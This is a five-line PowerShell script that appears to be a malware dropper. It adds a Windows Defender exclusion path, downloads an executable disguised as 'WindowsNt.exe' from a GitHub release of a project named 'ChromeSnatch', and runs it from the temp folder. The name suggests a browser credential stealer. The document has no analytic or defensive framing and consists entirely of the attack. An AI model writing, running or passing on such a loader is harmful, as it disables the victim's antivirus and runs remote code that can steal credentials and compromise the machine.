$path = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Temp"
Set-MpPreference -ExclusionPath $path
Invoke-WebRequest -Uri "https://github.com/SAKIB-SALIM/ChromeSnatch/releases/Sadik/download/WindowsNt.exe" -OutFile "$env:TEMP\WindowsNt.exe"
Start-Process "$env:TEMP\WindowsNt.exe"
exit;
